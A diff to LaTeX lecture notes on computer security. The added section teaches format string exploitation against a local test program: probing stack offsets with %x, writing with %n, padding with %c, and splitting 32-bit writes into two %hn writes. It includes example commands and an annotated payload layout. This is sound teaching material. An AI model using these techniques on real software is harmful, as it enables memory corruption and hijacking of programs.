@@ -55,6 +55,8 @@
 \newcolumntype{M}[1]{>{\centering\arraybackslash}m{#1}}
 \newcolumntype{Y}[1]{>{\centering\arraybackslash}X{#1}}
 
+\usepackage{changepage}
+
 \author{Matteo Secco}
 \title{Computer Security}
 
@@ -757,5 +759,119 @@ buffer: f59b87a0 d1772d80 d1772d897
 $ ./code "%3\$x"
 buffer: d1772d897	#the third!
 \end{lstlisting}
-We can use loops to find interesting positions (design the vulnerability), and then aim for those positions directly (deploy it).
+We can use loops to find interesting positions (design the vulnerability), and then aim for those positions directly (deploy it):
+\begin{lstlisting}[language=bash]
+$ for i in `seq 1 3`; do echo -n "$i " && ./code "$i\$x"; done
+1 buffer: f59b87a0 
+2 buffer: d1772d80 
+3 buffer: d1772d897
+\end{lstlisting}
+We can also look for specific values:
+\begin{lstlisting}[language=bash]
+$ for i in `seq 1 3`; do echo -n "$i " && ./code "$i\$x"; done | grep d897
+3 buffer: d1772d897
+\end{lstlisting}
+
+\subsection{Writing using format string bugs}
+\paragraph{Super powerful placeholder:} printf("hello\color{blue}\%n \color{black}",\&i) $\rightarrow$ writes \underline{in i} the \underline{number of chars (bytes)} printed so far (in the example it will write 5)
+\paragraph{Writing an address on the stack:}
+\begin{lstlisting}[language=bash]
+$ ./code "AAAA%2$n"
+\end{lstlisting}
+Is equivalent to 
+\begin{lstlisting}[language=bash]
+$ ./code "`python -c 'print "AAAA%2$n"'`"
+\end{lstlisting}
+Which is equivalent to 
+\begin{lstlisting}[language=bash]
+$ ./code "`python -c 'print "\x41\x41\x41\x41%2$n"'`"
+\end{lstlisting}
+We can replace the \textbackslash x41 with whatever bytes we like (in hex), inserting whatever address we like 
+\paragraph{Writing arbitrary numbers} 
+\begin{lstlisting}[style=CStyle]
+void main(){		//padding.c
+	printf("%050c\n",'D');
+	printf("%030c\n",'D');
+	printf("%013c\n",'D');
+}
+\end{lstlisting}
+\begin{lstlisting}[language=bash]
+$ ./padding
+00000000000000000000000000000000000000000000000000D	#50
+000000000000000000000000000000D	#30
+0000000000000D		#13
+\end{lstlisting}
+Using this:
+\begin{lstlisting}[language=bash]
+$ ./code "`python -c 'print "\x41\x41\x41\x41%50000c%2$n"'`"
+\end{lstlisting}
+We are writing the value 50004 (50000 for the padding, 4 for the bytes of the address)
+\paragraph{The vulnerability so far} $\underbrace{\backslash xcc \backslash xf6 \backslash xff \backslash xbf}_{\substack{\text{the address of the}\\\text{memory cell}\\\text{we want to modify}}}
+\%\underbrace{6024}_{\substack{\text{value we want}\\-4\text{(address)}}}c
+\underbrace{8}_{\substack{\text{offset on the stack}\\\text{of the target address}\\\text{found using \%x to read)}}}\$n$
+\paragraph{Writing big numbers} we usually want to write a valid 32 bit address ad an arbitrary number. This could require a super long padding string (up to 4GB). To reduce the size written, we can split it in 2 16-bit words. \\
+Because using \%c we can only increase, and we must perform the writing twice \underline{in the same string} (as we can only pass one string), we need to do some math:
+\begin{enumerate}
+\item Word with lower \underline{absolute value}
+\item Word with higher \underline{absolute value}
+\end{enumerate}
+\paragraph{New vulnerable string 1):} use case: 0x\color{red}4545\color{blue}4040 \color{black}(\color{red}first half \color{black} $>$ \color{blue} second half\color{black})\\
+\begin{adjustwidth}{-3cm}{-3cm}
+\centering
+$\underbrace{
+	\color{green}<\text{tgt+2}>
+	<\text{tgt}>
+}_{\substack{\text{target addresses placed}\\\text{ on the stack to be read}\\\text{as argument of \%\dots n}\\\text{(bytes in reverse order)}}}
+\overbrace{
+	\color{black}\%
+	\underbrace{
+		\color{blue} <\text{low}\_\text{val}-\text{\#printed}>
+	}_{
+		\color{blue} 0\text{x}4040 - 8\color{black}
+	}
+	\color{black} c
+}^{
+	\substack{
+		\text{use padding to write }\\
+		\text{the desired number of chars}
+	}
+}
+\overbrace{
+	\%
+	\underbrace{
+		\color{blue} <\text{stack}\_
+		\text{offset}>
+	}_{\text{point to \color{red}}<
+	\text{address}>}
+	\color{black} \$hn
+}^{
+	\text{write to }<\text{address}>\text{ using \%hn}
+}
+\overbrace{
+	\color{black} \% 
+	\underbrace{
+		\color{red} <\text{high}\_\text{val}-\text{low}\_\text{val}>
+	}_{
+		\color{red} 0\text{x}4545-\text{x}4040
+	} 
+	\color{black} c
+}^{
+	\substack{
+		\text{use padding to write }\\
+		\text{the desired number of chars}
+	}
+}
+\overbrace{
+	\color{black} \%
+	\underbrace{
+		\color{red} <\text{stack}\_\text{offset+1}>
+	}_{
+		\text{point to}<\text{address+2}>
+	}
+	\color{black} \$n
+}^{
+	\text{write to}<\text{address+2 using \%hn}>
+}
+$
+\end{adjustwidth}
 \end{document}
